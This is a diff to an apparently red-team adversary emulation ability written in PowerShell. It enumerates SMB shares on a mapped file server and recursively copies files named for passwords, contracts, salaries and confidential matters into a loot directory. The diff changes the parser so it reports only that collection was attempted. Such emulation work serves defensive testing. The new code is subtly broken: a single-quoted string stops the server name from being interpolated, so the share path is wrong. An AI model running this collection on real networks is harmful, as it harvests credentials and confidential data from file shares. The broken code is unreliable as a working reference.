@@ -12,15 +12,27 @@
     windows:
       psh:
         command: |
-          $fileServer = "FS01.ifs.network";
-          $stagingDir = "C:\Users\Public\Loot";
-          New-Item -Path $stagingDir -ItemType Directory -ErrorAction SilentlyContinue;
-          Get-ChildItem -Path \\$fileServer -Recurse -Include "*contract*", "*password*", "*secret*" | ForEach-Object {
-              Copy-Item -Path $_.FullName -Destination $stagingDir;
+          $fileserver = Get-SmbMapping | Select-Object RemotePath -Last 1 | ForEach-Object {
+              if ($_.RemotePath -match '\\\\(.*)\\.*') {
+                  $matches[1];
+              }; };
+              
+          $folders = Get-WmiObject -Class Win32_Share -ComputerName $fileserver | Where-Object { $_.Name -notlike '*$' } | Select-Object -ExpandProperty Name;
+
+          $fileServerFqdn = '$fileserver.#{domain.name}';
+          $lootDir = "#{env.dir.loot}";
+          $keywords = @("*contract*", "*password*", "*salary*", "*confidential*");
+
+          foreach ($fold in $folders) {
+              $share = "\\$fileServerFqdn\$fold";
+              if (Test-Path $share) {
+              Get-ChildItem -Path $share -Recurse -Include $keywords -ErrorAction SilentlyContinue | ForEach-Object { Copy-Item -Path $_.FullName -Destination $lootDir -Force;
+              }; }; 
           };
+          Write-Host "File-Collection-Attempted: TRUE";
         parsers:
           plugins.adversary_emulation.app.parsers.regex_parser:
-            - source: 'files.collected'
+            - source: 'collection.files.status'
               custom_parser_vals:
-                regex: 'Copied\s+(\d+)\s+files\s+to\s+C:\\Users\\Public\\Loot'
-                edge_label: 'collected_files'
+                regex: 'File-Collection-Attempted:\s+(.*)'
+                edge_label: 'was_attempted'
